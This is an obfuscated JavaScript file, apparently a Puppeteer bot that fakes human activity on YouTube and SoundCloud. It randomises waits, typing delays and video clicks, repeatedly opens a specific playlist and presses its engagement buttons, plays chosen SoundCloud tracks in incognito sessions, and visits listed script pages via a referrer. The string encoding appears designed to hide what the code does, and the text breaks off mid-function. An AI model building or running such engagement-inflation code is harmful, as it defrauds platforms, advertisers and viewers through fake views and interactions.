const V = d,
  U = c,
  T = b;

function a() {
  const bk = [
    'oper-roadm',
    'ksbbChbSzvDLyG',
    'Cg9ZDa',
    'W4v5WO0pWPNcHqVcVM8h',
    'tgOXrwnttuDLEq',
    'rg/en/scri',
    'W45iWR9+WRBcLx0MWQSq',
    'DCohW5ZdLSohW4SpW6medG',
    'nfJcHmkAWOOwcfeEWOK',
    '9ca2372ee2',
    'tI3dUJu7ACkal8kMdG',
    'zwfZEwzVCMSUBW',
    'AmoRW7aLW6tcVKf1WRhdUW',
    'q3n4BeXnyJzvAG',
    'CMfUzg9T',
    'HfP4TO3gfN',
    'easyfork.o',
    'W5viW6TRWR3cJZDKWRqm',
    'doCreateSe',
    'ns-io-game',
    'yG93',
    '8XkcbdSRdO',
    'wSokWOj3WP7dUtFcK8o7W7m',
    'bcPzW7NdRM1TWPRdL8os',
    'witter_Ima',
    'zgLNzxn0',
    'youtubeext',
    'W59bW43dQSo9u8kdW5K+cG',
    'ChrZlZq1mtu0nW'
  ];
  a = function() {
    return bk;
  };
  return a();
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0xb1b * 0x2 + -0xe5d * -0x2 + -0x32f0);
    let h = e[f];
    if (b['mVWgPQ'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x4be + 0xe * -0x272 + 0x1d7e, s, t, u = -0x1fd8 + 0x24ad * 0x1 + -0x4d5; t = n['charAt'](u++); ~t && (s = r % (-0x1cb6 + 0x2592 + 0x8d8 * -0x1) ? s * (0xfd * 0xa + 0x1a14 + -0x23b6) + t : t, r++ % (0x18d1 + 0x26af + -0x3f7c)) ? p += String['fromCharCode'](-0x1b6a + -0x1493 + 0x30fc & s >> (-(-0x1c5e + -0x7 * -0x38b + 0x1 * 0x393) * r & 0x16b9 + -0x1b01 + 0x44e)) : -0x95f + 0x27f * 0x7 + 0x7a * -0x11) {
          t = o['indexOf'](t);
        }
        for (let v = -0x2 * 0xd22 + 0x1bfb + 0x1 * -0x1b7, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x9 * 0x1c9 + -0xff * 0x10 + -0x11))['slice'](-(-0xa6d + 0x558 * 0x2 + -0x41));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0xd9 + 0x7d5 * 0x1 + 0x95 * -0xc,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x264b + 0x2b * 0xaf + 0x3 * -0x1690; u < -0x24 + -0x158f * 0x1 + 0x16b3; u++) {
          p[u] = u;
        }
        for (u = 0x248b + 0x1 * 0x1f6c + 0x89 * -0x7f; u < 0x205a + 0x6e5 * -0x4 + -0x3c6; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x2e * -0xd6 + -0x2 * -0x1227 + 0x326), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1336 * -0x2 + -0x15f1 + -0x107b, q = 0x1d91 + 0xb0d + -0x289e;
        for (let v = 0x22e7 + -0x1bb4 + -0x733; v < n['length']; v++) {
          u = (u + (0x1 * -0x18f5 + 0xed3 + 0xa23)) % (0x8c3 * -0x1 + 0x1213 + 0x85 * -0x10), q = (q + p[u]) % (0x1163 * 0x2 + 0xa18 + -0x2bde), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x752 + -0x1 * -0x1669 + -0xe17)]);
        }
        return t;
      };
      b['CZaPYb'] = m, c = arguments, b['mVWgPQ'] = !![];
    }
    const j = e[-0xd * 0x3 + 0xad5 + 0xaae * -0x1],
      k = f + j,
      l = c[k];
    return !l ? (b['DRDFYw'] === undefined && (b['DRDFYw'] = !![]), h = b['CZaPYb'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x833 * 0x4 + -0x1cb6 + 0x3d83 * 0x1))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0xfd * 0xa + 0x1a14 + -0x23f6), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x94e6 + 0xe815 + -0x107cb + (-0x523e + -0x3db7 + 0xca8d) * random()) : await standardWaitForNetIdle(f), await wait(-0x1c5e + -0x7 * -0x38b + 0x1 * 0x1719 + (0x2d71 + -0x3602 + 0x2fa1) * random()), -0x95f + 0x27f * 0x7 + 0x2b3 * -0x3;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x2 * 0xd22 + 0x1bfb + 0x1 * 0x11d1), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x9 * 0x1c9 + -0xff * 0x10 + -0x20;
}
async function randomWait() {
  return await wait(-0xa6d + 0x558 * 0x2 + 0x1345 + (-0xd9 + 0x7d5 * 0x1 + 0x49 * 0x2c) * random()), 0x264b + 0x2b * 0xaf + 0x1 * -0x43af;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x24 + -0x158f * 0x1 + 0x15b3, 0x248b + 0x1 * 0x1f6c + 0x87e * -0x8), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x18435 + 0xa574 * -0x2 + 0xb113) * getRandomInt(0x2e * -0xd6 + -0x2 * -0x1227 + 0x228, -0x1336 * -0x2 + -0x15f1 + -0x1076), h)), 0x1d91 + 0xb0d + -0x289d;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x22e7 + -0x1bb4 + -0x733;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x1 * -0x18f5 + 0xed3 + 0xa23]['split']('\x20');
    for (let k = 0x8c3 * -0x1 + 0x1213 + 0x12a * -0x8; k < i['length']; k += 0x1163 * 0x2 + 0xa18 + -0x2cdc)
      j += i[k] * h[i[k + (-0x752 + -0x1 * -0x1669 + -0xf16)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0xd * 0x3 + 0xad5 + 0x155 * -0x8)['map'](l => Array['from'](l['children']))['flat'](-0x89 * 0x1d + -0x4a * -0x29 + 0x3ac)['map'](l => l['childNodes'][0xd67 + 0x1f52 + -0xc * 0x3ba]['childNodes'][-0x25ee + -0x1f48 + -0x4536 * -0x1]['childNodes'][-0x4a2 * -0x5 + -0x1e9b + 0x772]['childNodes'][0x1866 + 0x91 * -0x22 + -0x524]['childNodes'][0x2143 + -0x1 * -0x49b + 0x1 * -0x25dd]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x2301 + 0x868 + -0xa2b * -0x3, -0xd1f + -0x1a * 0x17c + 0x473f)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x2c18 + -0xbf * 0x29 + 0x2d17);
  const h = await getMaxTime(f),
    i = Math['min']((0x2d42 + 0x1a9a7 + 0x1 * -0xec89) * getRandomInt(-0x16a1 + -0x1 * -0x8d9 + -0xa * -0x161, 0x473 + -0x1 * 0x954 + 0x4e6), h);
  return await wait(i), -0x1 * -0x2479 + 0x2f9 * 0xb + -0x452b;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x7 * -0x45b + -0x1ed3 + 0x3d50]['children'][-0x1 * 0x20c3 + 0x12cb + 0xdf8]['children'][-0x15 * -0x3f + -0x17f0 + -0x12c5 * -0x1]['children'][0xc6b + -0x3 * -0xac + -0xe6f]['children'][0x17 * -0xb3 + -0x111f + 0x2134]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x164 * -0x13 + 0x235 * -0x6 + -0xd2d;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x1e1 * -0x1 + 0xb * -0x224 + 0x1 * 0x19d1 + (-0x11 * 0x79 + -0x2e3 * -0x1 + 0x558) * random()
  }), await wait(-0xbdf * 0x3 + 0x17ec + -0x1f3 * -0x7 + (0x29 * -0x11 + -0x2232 + -0x2617 * -0x1) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0xc3 * 0xa + 0x2 * 0x2b3 + 0x23a]['childNodes'][-0xd54 * 0x2 + -0x5 * 0x675 + 0x3af2]['childNodes'][0xa33 + 0x13ed * 0x1 + 0xb * -0x2bd]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x5ad * 0x6 + -0x1 * -0x11b7 + -0x33c0]['childNodes'][-0x26f9 + 0xaab + -0x1c4e * -0x1]['childNodes'][-0x1ee * 0x7 + 0x10be + 0x76 * -0x7]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x24 * -0x99 + 0xaa5 + -0x2028),
          r = 0x1 * -0x157c + 0x1 * -0x19f6 + 0x2f72;
        for (let u = 0x224 + 0x2 * -0x515 + 0x2 * 0x403; u < q['length']; u += 0x125e + -0x1877 + -0x209 * -0x3)
          r += q[u] * k[q[u + (0x160f * 0x1 + -0x1 * 0xd75 + -0x47 * 0x1f)]];
        return r;
      }(n);
  });
  await wait((0xc * 0x60f + 0x6a79 + -0x1 * 0x7895) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x33a3 * 0x1 + 0x53a * -0x2d + 0x61 * 0x44f) * getRandomInt(0x61 * 0x2b + 0x2 * 0x9bb + -0x23c0, 0x251a + 0x6d9 * -0x5 + -0x2d3), h + (0xb47 * -0x1 + 0xd41 + 0x118e));
  return await wait(i), 0x27 * -0x9a + 0x1 * 0x72a + 0x104d;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x20ce + 0x246 * -0x11 + 0x5d8), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x2be + -0x1cc4 + 0x2b3a + (-0x14 * 0x16a + -0x1b55 * 0x1 + 0x3b85) * Math['random']());
    });
  }, -0xdb2 * 0x3 + -0x3 * 0x601 + 0x5671 * 0x1);
  await wait(0x4 * -0x6c8c + -0x503b8 + -0x2606 * -0x4c);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x20e * 0xcd + -0x12392 + 0x68bc) * getRandomInt(-0x14d + 0x184 * -0x2 + 0x459, -0x6c0 * 0x3 + 0x26b0 + -0x1257)), clearInterval(h), 0x1d * -0x7b + -0x456 + 0x1246;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x21b + -0x2062 + 0x1e47;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x79d * 0x3 + 0x504 + 0x11d4;
    await randomWait();
  }
  return -0x185 * -0xe + 0x1b01 + 0x14e * -0x25;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0xb1b * 0x2 + -0xe5d * -0x2 + -0x32f0);
    let h = e[f];
    return h;
  }, d(b, c);
}

function fetchRandomSC() {
  return Math['random']() <= 0xa0b + -0x88d + -0x17e + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x232c + 0xc95 * 0x1 + 0x1 * 0x1697 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x1 * -0x14b3 + -0x72f + 0xd84 * -0x1 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0xdf * 0xb + 0x13e0 + -0x1d75;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0xe152 + -0x4e9c + 0x1d12 + getRandomInt(0x2c47 + -0x3d * -0x1e8 + -0x65f7, -0x1e07 * -0x2 + -0x9b67 + 0xd489));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x4e3 + 0x24 * -0x3b + -0x2e * -0x13), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x16f9 + 0x1edf * 0x1 + -0x1 * 0x7e6;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x2d * 0x77 + 0x1c26 + -0x3111, -0x41 * -0x3 + 0x3e2 + 0x1 * -0x473)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x2397 + -0x6f2 + -0x14d5 * 0x1 + floor((-0x168e + 0x2 * -0x1212 + 0x1 * 0x3e9a) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x783f164c + -0x8 * 0x9863bd2 + -0x4 * -0x14fcb211),
          0x99221d + -0xca1e55 + 0xb0fc38,
          -0xad99 + 0x4395 * -0x3 + 0x1f858,
          0xe08 + -0x2 * 0x487 + -0x1 * 0x47a
        ], y = [
          -0x9 * 0x83 + 0x1b53 * 0x1 + -0x16a0,
          0xa * 0x263 + -0xf5a * 0x1 + -0x874,
          0x26be + 0x1 * -0x2151 + -0x565,
          0x2486 + 0x1 * 0x815 + 0x259 * -0x13
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1171 + -0x3c8 + -0x1b5 * 0x8)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x1 * 0x16f6 + 0x2470 + -0x3b66; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              const R = c;
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')[R(0x19)]('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x2 * 0x131a + -0x7 * 0x27d + -0x14c9) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x1dd2 + -0x1b98 + -0x23a] = A[-0x1e0c * 0x1 + 0x1028 + 0x4c * 0x2f] = A[-0xad * -0x2f + -0x1 * 0x263c + -0x67a * -0x1] = A[0x1 * 0x2b9 + -0x342 + 0x1 * 0x8b] = A[0x1c35 + 0x2097 + -0x18f * 0x27] = A[-0x38b + 0x238e + 0x1fff * -0x1] = A[0x2254 + -0x1 * 0x2597 + 0x1 * 0x348] = A[-0xe44 + -0x1ba3 + 0x29ed] = A[0x1 * -0x257f + -0x36 * -0x9d + 0x8d * 0x8] = A[0x1243 + -0x3f6 + 0xd * -0x119] = A[-0xc34 + 0xe55 * 0x1 + 0x1 * -0x218] = A[-0xa15 + -0xad1 + 0x5 * 0x430] = A[0x1af * -0x15 + -0x7a5 * 0x2 + 0x32b0] = A[-0x1b11 + -0xea5 + 0x29c2] = A[0x1 * 0x1ba1 + -0x25 * -0x5c + -0x3 * 0xda0] = A[-0x9be + 0x539 + 0x493] = A[-0x5 * -0x389 + 0x243 * -0x3 + -0xad5] = -0x19ef + -0x1 * -0x19db + 0x14, this['blocks'] = A) : this['blocks'] = [
                -0x1a9b * -0x1 + 0xa * -0x1c0 + -0x91b,
                -0x1c52 + -0xa74 + 0x26c6,
                -0x353 + 0x16b4 + -0x1361,
                -0x146d + -0x13a * -0x1a + -0xb77,
                -0x1 * 0x8e4 + 0xe7d * -0x2 + 0x25 * 0x106,
                -0x19d * -0x5 + -0x16 * 0x137 + 0x12a9,
                -0xc87 * 0x3 + -0x783 * -0x5 + 0x6,
                0x4c + 0x1e9 + -0x1 * 0x235,
                0x1a40 + -0x9 * -0x301 + 0x3549 * -0x1,
                0x3 * 0xcab + 0x4 * -0x8d3 + -0x2b5,
                -0x24f5 + 0x1f58 + 0x59d,
                0x2 * 0x4ef + -0xac + -0xd6 * 0xb,
                0x1b37 + -0x2 * 0x1131 + 0x16f * 0x5,
                0x1899 + 0x2428 + -0x67 * 0x97,
                -0x36 * -0x31 + 0x4a4 + -0x12 * 0xd5,
                0xb85 + -0x6d * -0x26 + -0x1bb3,
                -0x1023 * -0x1 + -0x1 * -0xbea + -0x1c0d * 0x1
              ], this['h0'] = 0x456095 * -0xe3 + -0x61c23282 + 0x1068bf9a2, this['h1'] = 0x1 * 0xdbe38811 + 0x14e6ddeba + -0x13a83bb42, this['h2'] = -0x15b742b * 0x5c + 0x9aa73065 + 0x7af16c0d, this['h3'] = -0x248 * 0xbccbd + -0x72af17b * -0x1 + 0x23f27223, this['h4'] = 0x1 * 0x133a0e5ec + 0x10b5813f3 + -0x17b2617ef, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x5f8 + -0x1 * 0x1039 + 0x1631, this['finalized'] = this['hashed'] = -0x17a5 + 0x16bd + 0xe8, this['first'] = 0x4 * -0x8e3 + -0x94e * 0x2 + -0xeb * -0x3b;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x78d * 0x3 + -0x134a + -0x35d, O = J['length'] || 0x1c5c + -0xa01 + -0x125b, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0xbcd + -0x24a2 + 0x18d5, P[0x7d3 * -0x1 + 0x2b1 + 0x522] = this['block'], P[0x19b7 + 0x143c * -0x1 + -0x13 * 0x49] = P[-0x2 * -0xe54 + 0x1a49 + -0x36f0] = P[0x1365 + -0x1 * -0x714 + -0x1a77] = P[0x1e9e + -0x2293 + -0x4 * -0xfe] = P[0x41 * 0x8 + 0xad * 0x2f + -0x21c7] = P[0xf2a + 0x12cc + -0x21f1] = P[-0x2347 + -0x1215 + 0x3562] = P[0x690 + -0x10 * 0x62 + -0x69] = P[0x227f * 0x1 + 0x1 * 0xbf5 + -0x2e6c] = P[0x1 * -0x1a0a + 0x7db * 0x1 + 0x1238] = P[0x1 * 0x142c + -0x8a1 + -0xb81] = P[0x1b1f + 0x8 * -0x107 + -0x12dc] = P[0x2455 + -0x5 * 0x3da + -0x1107] = P[-0x2d9 * 0xb + -0x2 * 0xa1f + 0x19cf * 0x2] = P[-0x1 * -0x25e3 + -0x20f0 + -0x4e5] = P[0x1 * 0x1691 + 0x1c60 + -0x32e2] = -0x101f * 0x2 + -0x1 * 0x1997 + -0x8d * -0x69), K) {
                    for (N = this['start']; M < O && N < 0xd09 + 0x3d8 + -0x10a1; ++M)
                      P[N >> -0xd5 + 0x2411 + -0x233a] |= J[M] << y[-0x2 * 0x2da + 0x1 * -0x15d0 + 0x1b87 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0xd9 * -0x25 + 0x1e4f + 0x14e; ++M)
                      (L = J['charCodeAt'](M)) < 0x1fba + -0xa7 + 0xa31 * -0x3 ? P[N >> 0xd * -0x131 + 0x1f8f + -0x1010] |= L << y[0xb96 + 0x1633 + -0x21c6 & N++] : L < 0x268c + 0xc89 + 0x1 * -0x2b15 ? (P[N >> 0xb5 * 0x1 + -0x1b12 + 0x1a5f] |= (-0x1 * -0x3c6 + 0x4bd + -0x7c3 | L >> -0x22 * 0xac + -0x5d9 * -0x5 + -0x65f) << y[-0xe * 0x10d + 0x27 * -0xef + 0x4d * 0xaa & N++], P[N >> -0xeef + -0x115c + -0x1 * -0x204d] |= (-0x25fc + -0x9fb * 0x1 + 0x3077 | 0x20b9 + -0x1b07 + -0x573 & L) << y[-0xe83 + 0x1 * 0x5ed + 0x47 * 0x1f & N++]) : L < 0x20a6 * 0xc + 0x12bd2 + -0x1db9a || L >= 0x12336 + 0x19c1e + -0x1df54 ? (P[N >> -0x18e0 + 0x13da + 0x38 * 0x17] |= (0x158e + 0x9 * 0x392 + 0x50 * -0xa9 | L >> -0x1 * -0x5b6 + -0xd * -0x5 + -0x5eb) << y[-0x1616 + -0x5cf + 0x1be8 & N++], P[N >> 0x1498 + -0x1e40 + -0x4d5 * -0x2] |= (-0x1 * 0x145c + -0x53f * 0x6 + 0x3456 | L >> -0x6 * 0x83 + 0x17e * -0x16 + 0x23ec & -0x2 * -0xcdb + -0x10d9 + -0x89e) << y[0x1609 * -0x1 + 0x326 * -0x3 + 0x1 * 0x1f7e & N++], P[N >> -0x1808 + -0x8 * -0x263 + 0x1 * 0x4f2] |= (-0x1277 + 0x2ff * 0x1 + 0x1ff * 0x8 | -0x1ecb + -0xc8a + 0x4 * 0xae5 & L) << y[0x19bd + 0x1dd0 + 0x2 * -0x1bc5 & N++]) : (L = -0xe6f * 0x21 + 0x17f * 0x13 + -0x7 * -0x648e + ((0x1744 + -0x2e4 * -0xa + 0x3 * -0x100f & L) << -0x3 * 0xc28 + -0x151 + 0x25d3 | -0x1 * 0xfdd + -0x1 * 0x1363 + -0x273f * -0x1 & J['charCodeAt'](++M)), P[N >> 0x1c6d + -0x1e96 + 0x22b] |= (-0x1 * 0xa7d + 0x2 * -0x114a + 0x2e01 | L >> 0x12ea + -0x14f8 + 0x220) << y[-0x647 + -0xcf7 * 0x3 + 0x2d2f & N++], P[N >> 0xcdc * 0x3 + 0x3 * 0xa06 + 0x1129 * -0x4] |= (0xa28 + 0x20c4 + -0x2a6c | L >> -0x421 * -0x1 + -0x1e6b * 0x1 + 0x1 * 0x1a56 & -0x974 * 0x2 + 0x209 * -0x5 + 0x755 * 0x4) << y[0x3e2 + -0x5a * -0x49 + -0x1 * 0x1d89 & N++], P[N >> 0x234a * 0x1 + -0x2449 + 0x101] |= (-0x25f + -0x138 * 0x1a + 0x228f | L >> -0x7 * 0x405 + 0x1 * -0x1ea5 + 0x3ace & -0x2290 + -0x1319 * 0x1 + 0x35e8) << y[0xb * -0x125 + -0x8a * -0xb + 0x1c * 0x3d & N++], P[N >> 0x1d * 0xd1 + -0x9ed * -0x2 + -0x2b85 * 0x1] |= (-0xda1 + 0xb8a + 0x297 | 0x19bc * -0x1 + 0xb81 + 0x73d * 0x2 & L) << y[0x12af * -0x1 + -0x206c + 0x331e & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x1 * -0x174e + 0x2f * -0x4a + 0x2524 ? (this['block'] = P[0x2ad + 0x253b + 0x13ec * -0x2], this['start'] = N - (-0x8ee * 0x3 + -0x7ef * 0x2 + 0x4 * 0xaba), this['hash'](), this['hashed'] = -0x1614 + -0x1c9f * -0x1 + -0x68a) : this['start'] = N;
                }
                return this['bytes'] > -0x1537f3dd3 + 0x5c6afad * 0x3b + -0x1 * -0xfeb4c0f3 && (this['hBytes'] += this['bytes'] / (-0x1e49f184 + 0x5bbb7a3c + 0xc28e7748) << -0x719 + 0x1 * 0xb03 + -0x3ea, this['bytes'] = this['bytes'] % (0x1571a887c + 0x1f7a65cb8 + -0x24ec0e534)), this;
              }
            }
            ['finalize']() {
